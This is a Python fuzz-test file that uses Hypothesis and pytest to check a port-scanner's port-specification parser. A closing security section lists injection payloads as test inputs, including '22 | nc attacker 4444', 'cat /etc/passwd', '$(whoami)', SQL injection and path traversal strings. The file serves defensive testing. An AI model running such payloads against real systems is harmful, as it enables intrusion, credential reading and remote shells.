#!/usr/bin/env python3
"""
Fuzz Tests for Port Input Parsing
=================================

Tests port specification parsing from the port-scanner tool.
Handles single ports, ranges, comma-separated lists, and keywords.

Uses Hypothesis for property-based testing to discover edge cases
in port specification parsing.
"""

import sys
from pathlib import Path
from typing import List, Set

import pytest
from hypothesis import assume, given, settings, HealthCheck
from hypothesis import strategies as st


# Add tools to path for imports
TOOLS_PATH = Path(__file__).parent.parent.parent / "tools"
sys.path.insert(0, str(TOOLS_PATH / "port-scanner"))


# =============================================================================
# Import target functions
# =============================================================================

try:
    from tool import parse_port_specification, TOP_20_PORTS, TOP_100_PORTS
    PORT_SCANNER_AVAILABLE = True
except ImportError:
    PORT_SCANNER_AVAILABLE = False
    parse_port_specification = None
    TOP_20_PORTS = list(range(1, 21))
    TOP_100_PORTS = list(range(1, 101))


# =============================================================================
# Constants
# =============================================================================

MIN_PORT = 1
MAX_PORT = 65535
VALID_PORT_RANGE = range(MIN_PORT, MAX_PORT + 1)


# =============================================================================
# Custom Strategies for Port Inputs
# =============================================================================

# Strategy for valid port numbers
valid_port = st.integers(min_value=MIN_PORT, max_value=MAX_PORT)

# Strategy for single port specification
single_port_spec = valid_port.map(str)

# Strategy for port range specification
valid_port_range = st.builds(
    lambda start, end: f"{min(start, end)}-{max(start, end)}",
    valid_port, valid_port
)

# Strategy for comma-separated port list
valid_port_list = st.lists(
    valid_port,
    min_size=1,
    max_size=10
).map(lambda ports: ",".join(str(p) for p in ports))

# Strategy for mixed port specification (ports and ranges)
mixed_port_spec = st.lists(
    st.one_of(single_port_spec, valid_port_range),
    min_size=1,
    max_size=5
).map(lambda specs: ",".join(specs))

# Strategy for port keywords
port_keywords = st.sampled_from(["top20", "top100", "TOP20", "TOP100", "Top20", "Top100"])

# Strategy for malformed port specifications
fuzzy_port_spec = st.one_of(
    # Invalid port numbers
    st.integers(min_value=MAX_PORT + 1, max_value=999999).map(str),
    st.integers(min_value=-999999, max_value=0).map(str),

    # Invalid range syntax
    st.text(alphabet="0123456789-,", min_size=1, max_size=30),

    # Double dashes
    st.builds(
        lambda a, b: f"{a}--{b}",
        valid_port, valid_port
    ),

    # Reversed range with spaces
    st.builds(
        lambda a, b: f"{b} - {a}",
        st.integers(min_value=1, max_value=100),
        st.integers(min_value=101, max_value=200)
    ),

    # Non-numeric content
    st.sampled_from([
        "abc",
        "22,abc,443",
        "22-abc",
        "abc-80",
        "22.0",
        "22.5",
        "22e3",
        "0x50",
        "http",
        "ssh",
        "all",  # "all" is valid keyword, but testing mixed
        "",
        " ",
        "  ,  ",
        "-",
        "--",
        ",-,",
        "22,,443",
        "22,",
        ",22",
        "22-",
        "-22",
    ]),

    # Large specifications
    st.builds(
        lambda n: ",".join(str(i) for i in range(1, min(n, 100))),
        st.integers(min_value=1, max_value=200)
    ),
)

# Strategy for arbitrary text
arbitrary_port_input = st.one_of(
    st.text(min_size=0, max_size=100),
    st.binary(min_size=0, max_size=50).map(lambda b: b.decode("utf-8", errors="ignore")),
    fuzzy_port_spec,
    valid_port_list,
    port_keywords,
)


# =============================================================================
# Helper Functions
# =============================================================================

def parse_ports_safe(spec: str) -> List[int]:
    """
    Safe wrapper around parse_port_specification.
    Returns empty list on error.
    """
    if not PORT_SCANNER_AVAILABLE:
        return []

    try:
        return parse_port_specification(spec)
    except Exception:
        return []


def is_valid_port(port: int) -> bool:
    """Check if port number is in valid range."""
    return MIN_PORT <= port <= MAX_PORT


def count_ports_in_spec(spec: str) -> int:
    """Estimate the number of ports in a specification."""
    if not spec:
        return 0

    spec = spec.strip().lower()

    # Handle keywords
    if spec == "top20":
        return 20
    if spec == "top100":
        return 100
    if spec == "all":
        return MAX_PORT

    total = 0
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue

        if "-" in part:
            try:
                start, end = part.split("-")
                start, end = int(start.strip()), int(end.strip())
                total += abs(end - start) + 1
            except (ValueError, IndexError):
                continue
        else:
            try:
                int(part)
                total += 1
            except ValueError:
                continue

    return total


# =============================================================================
# Fuzz Tests
# =============================================================================

@pytest.mark.fuzz
class TestPortInputFuzzing:
    """Fuzz tests for port specification parsing."""

    @given(port=valid_port)
    @settings(max_examples=200)
    def test_valid_single_port_parsing(self, port: int):
        """Valid single ports should parse correctly."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(str(port))
            assert len(result) == 1, f"Single port {port} produced {len(result)} results"
            assert result[0] == port, f"Port {port} parsed as {result[0]}"

    @given(start=valid_port, end=valid_port)
    @settings(max_examples=200)
    def test_valid_port_range_parsing(self, start: int, end: int):
        """Valid port ranges should parse correctly."""
        if PORT_SCANNER_AVAILABLE:
            # Ensure start <= end for the spec
            low, high = min(start, end), max(start, end)
            spec = f"{low}-{high}"

            result = parse_ports_safe(spec)

            # Should contain correct number of ports
            expected_count = high - low + 1
            assert len(result) == expected_count, \
                f"Range {spec} produced {len(result)} ports, expected {expected_count}"

            # Should contain all ports in range
            for port in range(low, high + 1):
                if is_valid_port(port):
                    assert port in result, f"Port {port} missing from range {spec}"

    @given(ports=st.lists(valid_port, min_size=1, max_size=20, unique=True))
    @settings(max_examples=200)
    def test_valid_port_list_parsing(self, ports: List[int]):
        """Valid comma-separated port lists should parse correctly."""
        if PORT_SCANNER_AVAILABLE:
            spec = ",".join(str(p) for p in ports)
            result = parse_ports_safe(spec)

            # All input ports should be in result
            for port in ports:
                assert port in result, f"Port {port} missing from result"

            # Result should not have more unique ports than input
            assert len(set(result)) == len(set(ports))

    @given(mixed=mixed_port_spec)
    @settings(max_examples=300, suppress_health_check=[HealthCheck.too_slow])
    def test_mixed_port_spec_parsing(self, mixed: str):
        """Mixed port specifications should parse without crashing."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(mixed)

            # All results should be valid ports
            for port in result:
                assert is_valid_port(port), f"Invalid port {port} in result from {mixed}"

    @given(keyword=port_keywords)
    @settings(max_examples=20)
    def test_keyword_parsing(self, keyword: str):
        """Port keywords should parse to expected port lists."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(keyword)

            keyword_lower = keyword.lower()
            if keyword_lower == "top20":
                assert len(result) == len(TOP_20_PORTS), \
                    f"top20 produced {len(result)} ports, expected {len(TOP_20_PORTS)}"
            elif keyword_lower == "top100":
                assert len(result) == len(TOP_100_PORTS), \
                    f"top100 produced {len(result)} ports, expected {len(TOP_100_PORTS)}"

    @given(fuzzy=fuzzy_port_spec)
    @settings(max_examples=500, suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much])
    def test_malformed_port_spec_does_not_crash(self, fuzzy: str):
        """Malformed port specifications should not crash the parser."""
        if PORT_SCANNER_AVAILABLE:
            try:
                result = parse_ports_safe(fuzzy)
                # All results should be valid ports
                for port in result:
                    assert is_valid_port(port), \
                        f"Malformed spec {fuzzy!r} produced invalid port: {port}"
            except (ValueError, TypeError):
                # These exceptions are acceptable
                pass

    @given(arbitrary=arbitrary_port_input)
    @settings(max_examples=1000, suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much])
    def test_arbitrary_input_does_not_crash(self, arbitrary: str):
        """Arbitrary input should never crash the port parser."""
        if PORT_SCANNER_AVAILABLE:
            try:
                result = parse_ports_safe(arbitrary)
                # If we got results, verify they're valid
                for port in result:
                    assert is_valid_port(port), \
                        f"Arbitrary input {arbitrary!r} produced invalid port: {port}"
            except Exception as e:
                # Only certain exceptions are acceptable
                acceptable = (ValueError, TypeError, AttributeError)
                assert isinstance(e, acceptable), \
                    f"Unexpected exception: {type(e).__name__}: {e}"


@pytest.mark.fuzz
class TestPortBoundaryConditions:
    """Test boundary conditions in port parsing."""

    @pytest.mark.parametrize("port", [1, 2, 80, 443, 1024, 8080, 32767, 32768, 65534, 65535])
    def test_boundary_port_values(self, port: int):
        """Test boundary port values."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(str(port))
            assert port in result, f"Boundary port {port} not parsed correctly"

    @pytest.mark.parametrize("invalid_port", [0, -1, -65535, 65536, 65537, 100000, 999999])
    def test_out_of_range_ports(self, invalid_port: int):
        """Out of range ports should be rejected or filtered."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe(str(invalid_port))
            # Invalid port should not appear in results
            assert invalid_port not in result, \
                f"Invalid port {invalid_port} should not be in result"

    def test_full_range_specification(self):
        """Test parsing of full port range 1-65535."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("1-65535")
            assert len(result) == MAX_PORT, f"Full range should have {MAX_PORT} ports"
            assert min(result) == MIN_PORT
            assert max(result) == MAX_PORT

    def test_all_keyword(self):
        """Test 'all' keyword produces all ports."""
        if PORT_SCANNER_AVAILABLE:
            result = parse_ports_safe("all")
            assert len(result) == MAX_PORT, f"'all' should produce {MAX_PORT} ports"


@pytest.mark.fuzz
class TestPortRangeProperties:
    """Test properties of port range parsing."""

    @given(
        start=st.integers(min_value=1, max_value=100),
        end=st.integers(min_value=1, max_value=100)
    )
    @settings(max_examples=100)
    def test_range_symmetry(self, start: int, end: int):
        """Range A-B should produce same result as B-A (after sorting)."""
        if PORT_SCANNER_AVAILABLE:
            spec1 = f"{start}-{end}"
            spec2 = f"{end}-{start}"

            result1 = sorted(parse_ports_safe(spec1))
            result2 = sorted(parse_ports_safe(spec2))

            # Both should produce the same sorted result
            assert result1 == result2, f"Ranges {spec1} and {spec2} differ"

    @given(
        ports=st.lists(valid_port, min_size=1, max_size=10, unique=True)
    )
    @settings(max_examples=100)
    def test_duplicate_removal(self, ports: List[int]):
        """Duplicate ports in specification should be deduplicated."""
        if PORT_SCANNER_AVAILABLE:
            # Create spec with duplicates
            duplicated = ports + ports
            spec = ",".join(str(p) for p in duplicated)

            result = parse_ports_safe(spec)

            # Result should have unique ports only
            assert len(result) == len(set(result)), "Duplicates not removed"
            assert len(set(result)) == len(set(ports))

    @given(
        base=st.integers(min_value=1, max_value=65000),
        count=st.integers(min_value=1, max_value=100)
    )
    @settings(max_examples=100)
    def test_consecutive_range_count(self, base: int, count: int):
        """Consecutive range should produce exact count of ports."""
        if PORT_SCANNER_AVAILABLE:
            end = min(base + count - 1, MAX_PORT)
            spec = f"{base}-{end}"

            result = parse_ports_safe(spec)
            expected = end - base + 1

            assert len(result) == expected, \
                f"Range {spec} produced {len(result)}, expected {expected}"


@pytest.mark.fuzz
class TestPortListProperties:
    """Test properties of port list parsing."""

    @given(
        n=st.integers(min_value=1, max_value=50)
    )
    @settings(max_examples=50)
    def test_sequential_list(self, n: int):
        """Sequential port list should produce correct count."""
        if PORT_SCANNER_AVAILABLE:
            ports = list(range(1, n + 1))
            spec = ",".join(str(p) for p in ports)

            result = parse_ports_safe(spec)

            assert len(result) == n, f"List of {n} ports produced {len(result)}"

    def test_empty_parts_handling(self):
        """Empty parts in specification should be handled gracefully."""
        if PORT_SCANNER_AVAILABLE:
            test_cases = [
                ("22,,443", {22, 443}),
                ("22,", {22}),
                (",22", {22}),
                (",,,22,,,443,,,", {22, 443}),
                ("  22  ,  443  ", {22, 443}),
            ]

            for spec, expected in test_cases:
                result = set(parse_ports_safe(spec))
                assert result == expected, f"Spec {spec!r} produced {result}, expected {expected}"


# =============================================================================
# Injection Attack Tests
# =============================================================================

@pytest.mark.fuzz
@pytest.mark.security
class TestPortInjectionAttacks:
    """Test for injection attack resistance in port inputs."""

    @pytest.mark.parametrize("malicious_input", [
        # Command injection attempts
        "22; ls",
        "22 && cat /etc/passwd",
        "22 | nc attacker 4444",
        "$(whoami)",
        "`id`",
        "22\n80",

        # SQL injection attempts
        "22' OR '1'='1",
        "22; DROP TABLE ports;--",

        # Path traversal attempts
        "22/../../../etc/passwd",
        "22%2F..%2F..%2Fetc%2Fpasswd",

        # Template injection
        "{{22*22}}",
        "${22+22}",

        # Null byte injection
        "22\x00extra",
        "22%00extra",

        # Overflow attempts
        "9" * 100,
        "-" * 50,
        "1-" + "9" * 100,

        # Format string attacks
        "%s%s%s%s",
        "%n%n%n%n",
        "{0}{1}{2}",
    ])
    def test_injection_attack_handling(self, malicious_input: str):
        """Malicious inputs should not produce unexpected behavior."""
        if PORT_SCANNER_AVAILABLE:
            try:
                result = parse_ports_safe(malicious_input)

                # All results must be valid port numbers
                for port in result:
                    assert is_valid_port(port), \
                        f"Malicious input {malicious_input!r} produced invalid port: {port}"

                    # Port should be an integer, not contain any special characters
                    assert isinstance(port, int), \
                        f"Port should be int, got {type(port).__name__}"

            except Exception:
                # Exceptions are acceptable for malicious input
                pass

    def test_very_large_range(self):
        """Very large range specification should not cause memory issues."""
        if PORT_SCANNER_AVAILABLE:
            # This should be handled but not consume excessive memory
            result = parse_ports_safe("1-65535")
            assert len(result) == MAX_PORT
            assert all(is_valid_port(p) for p in result)

    @given(
        n=st.integers(min_value=1, max_value=1000)
    )
    @settings(max_examples=10, deadline=10000)  # 10 second deadline
    def test_large_comma_list(self, n: int):
        """Large comma-separated lists should complete in reasonable time."""
        if PORT_SCANNER_AVAILABLE:
            ports = [str(p % MAX_PORT + 1) for p in range(n)]
            spec = ",".join(ports)

            result = parse_ports_safe(spec)

            # Should not hang or crash
            assert len(result) > 0 or n == 0
